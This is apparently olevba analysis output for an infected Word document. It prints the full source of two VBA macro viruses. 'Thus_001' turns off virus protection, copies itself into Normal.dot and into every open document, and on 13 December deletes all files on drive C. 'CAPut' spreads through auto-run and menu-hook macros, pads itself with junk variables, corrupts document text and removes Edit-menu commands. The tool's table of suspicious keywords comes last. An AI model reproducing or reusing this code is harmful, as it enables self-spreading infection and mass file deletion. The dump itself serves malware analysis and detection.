olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Thus-based-f30e66391a258769d61947669b35688b2c7c1af6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Thus-based-f30e66391a258769d61947669b35688b2c7c1af6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Thus_001'
    On Error Resume Next
    Application.Options.VirusProtection = False
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1) _
    .CodeModule.CountOfLines
    End If
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule _
    .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1) _
    .CodeModule.Lines(1, ActiveDocument.VBProject.VBComponents _
    .Item(1).CodeModule.CountOfLines)
    End If
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    For k = 1 To Application.Documents.Count
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.Lines(2, 1) <> "'Thus_001'" Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.DeleteLines 1, Application.Documents.Item(k) _
    .VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    End If
    If Application.Documents.Item(k).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
    Application.Documents.Item(k).VBProject.VBComponents.Item(1) _
    .CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents _
    .Item(1).CodeModule.Lines(1, NormalTemplate.VBProject _
    .VBComponents.Item(1).CodeModule.CountOfLines)
    End If
    Next k
    If (Day(Now()) = 13) And (Month(Now()) = 12) Then
    With Application.FileSearch
        .NewSearch
        .LookIn = "C:\"
        .SearchSubFolders = True
        .FileName = "*.*"
        .MatchTextExactly = False
        .FileType = msoFileTypeAllFiles
        If .Execute > 0 Then
        For i = 1 To .FoundFiles.Count
        Kill .FoundFiles(i)
        Next i
        End If
    End With
    End If
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub










































































-------------------------------------------------------------------------------
VBA MACRO CAPut.bas 
in file: Virus.MSWord.Thus-based-f30e66391a258769d61947669b35688b2c7c1af6 - OLE stream: 'Macros/VBA/CAPut'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub CAPut()
    
    ' CAPut! by --=|| N|c0t|N ||=-- 1998
    
On Error Resume Next
Randomize
JfAu17433 = RqNsDnSz & EoEj6923 & AwBfAgHz & KiQo8644
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("CAPut").Export "c:\system.drv"
ActiveDocument.ReadOnlyRecommended = False
PrMtOwNl = IgVz9625 & BiNh12935
CeVy15065 = PyKqDtEs & HuEu16043 & Int(Rnd * 7636)
JeOl = Int(Rnd * 100)
If JeOl = 3 Then Call AjMe9259LhSk
MqMz4946 = OuUlOyNl & PiAi4810 & Int(Rnd * 3652)
ClEj447 = LvPsPeKm & HxHj15520 & Int(Rnd * 221)
NgBqLwKf = GwMq13887 & SxHt6069
With Dialogs(wdDialogFileSummaryInfo)
    .Comments = "JU$t bEEn CAPuted!"
    .Execute
End With
CqMh5411 = EgCnTsQx & KqVy10676 & Int(Rnd * 9204)
If NormalTemplate.VBProject.VBComponents.Item("CAPut").Name <> "CAPut" Then AkCk84703417 = True
PgCr9803 = UiQuDhKk & BiEu7803 & Int(Rnd * 9188)
RtIhCrLj = QoEo9298 & BfVo9019
If ActiveDocument.VBProject.VBComponents.Item("CAPut").Name <> "CAPut" Then MrJm3419 = True
NzCsBeMr = CmNx10042 & UoUi1996
LsNmIwHu = EqDi18147 & NqBj9202
If AkCk84703417 = True And MrJm3419 = False Then Set DvIe341847012 = NormalTemplate.VBProject.VBComponents
If AkCk84703417 = False And MrJm3419 = True Then Set DvIe341847012 = ActiveDocument.VBProject.VBComponents
DvIe341847012.import "c:\system.drv"
CmHnCnSp = JtMn14474 & OhVn11869
OsNuSmMo = BeTi8996 & UhHo8214
If activeinst = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
QeRg10393 = FoIpGwJe & JwMp9412 & Int(Rnd * 5044)
AzSp15416 = UwBxExUt & IkFo5185 & NmTiGxVk & LxDe11126
If MrJm3419 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
HfUvIjIe = SnOs13009 & JuQg10355
NsGhGfPm = GtSq14068 & VfAy5029
EsFiDzTx:
End Sub
Sub HelpAbout()
    On Error Resume Next
BuNr7381 = LiGpQjRr & GnJp10814 & KvCpCuCo & KwRk6617
    MsgBox "CAPut!  by --=|| N|c0t|N ||=-- (c) 1998", vbInformation
IlCr16749 = MxGoDtAk & TrUm12168 & FsFkHxUn & DwAv11295
End Sub
Sub FileSave()
    On Error Resume Next
LiReDfMf = EnKh8330 & QuPp8162
    Call CAPut
OiEmAoOl = VmVv8905 & AePg13070
    ActiveDocument.Save
KyIjRuNw = JyFr9740 & QqGi11191
OrIl7155 = BhEyNeSt & SiRw7417 & Int(Rnd * 1353)
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
UeVq8762 = LeTwLhTq & PsKl9343 & Int(Rnd * 7036)
JtHwAfJv = ChBu12592 & LoJf11295
    Call CAPut
IfFmUpFg = NuPl7936 & HwCr13540
End Sub
Sub AutoOpen()
    On Error Resume Next
QlFo19630 = NsUmEiSq & JqFp460 & QlKxAqIw & UgVh7676
    Call CAPut
End Sub
Sub AutoClose()
    On Error Resume Next
HjStSfFo = AxOm6853 & GhDr14428
    Call CAPut
DoHt2929 = RfIqPmPe & SeCo13071 & Int(Rnd * 686)
HvOn9750 = NwJrQzJx & ChJe11694 & Int(Rnd * 4012)
End Sub
Sub ToolsMacro()
    On Error Resume Next
CyRo9000 = NlUkNsBj & BuRm11812 & MjNsGuFv & MhEs2356
    Call CAPut
HqHp4787 = VpBwNkEm & AoRl6538 & JkAzLeSj & DxIp5806
CjAv14381 = JjDmDzHz & BxUx11288 & Int(Rnd * 6172)
FvIpPfCh = UqFz11115 & BwTh7561
MsgBox "Word Basic Err =7"
TfAq15178 = SpAnDmRe & AiUo2717 & Int(Rnd * 7401)
End Sub
Sub FileTemplates()
    On Error Resume Next
MmSmVuQh = LjOe15478 & VxNs8057
OzTu6393 = JmPvLnFj & TyKw8465 & MnMqQqCj & QqDm16199
    Call CAPut
LhTh9643 = EzTjDpBl & IoUx9530 & PtJnVeFi & JuNt13020
AoBfPfOk = RzUe14069 & EwLt12905
CeVkJnOj = KsAk8906 & FvEx10947
MsgBox "Word Basic Err =7"
PtNe5508 = MmBpNxEl & OoOr13476 & PzCuIqEr & UgJz12108
End Sub
Sub ViewVBCode()
    On Error Resume Next
QjMpPxDw = PqOp10698 & JlBx6379
CfAi13770 = KfUoFuHl & DqCk11244 & Int(Rnd * 8128)
    Call CAPut
OuIhRfOn = IzQv14238 & RzLw10974
EqMm11281 = GjGhPjBs & OkUj9131 & OsMpOnUu & AjAk10214
MsgBox "Word Basic Err =7"
JlIy4686 = UoHuRxHt & SnFm13906 & Int(Rnd * 7980)
End Sub
Sub AjMe9259LhSk()
    On Error Resume Next
FzVh10936 = RfOlAkMn & MoEf14498 & TuSlVpVw & DqRn10462
RmRjIyOi = OsCx3822 & UtEv11914
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "19"
            .Replacement.Text = "CAPut!'"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
LhGsIuCt = MjTm10450 & DiQy15385
KiQuVgUl = DsNj9548 & UwDs6561
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
KnMm8959 = NmKwMrLu & QoHs9797 & BeOoEjVl & PzMr9627
CommandBars("edit").Controls("Replace...").Delete
InHl11520 = IrHrQuFl & AnFk11599 & Int(Rnd * 6442)
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

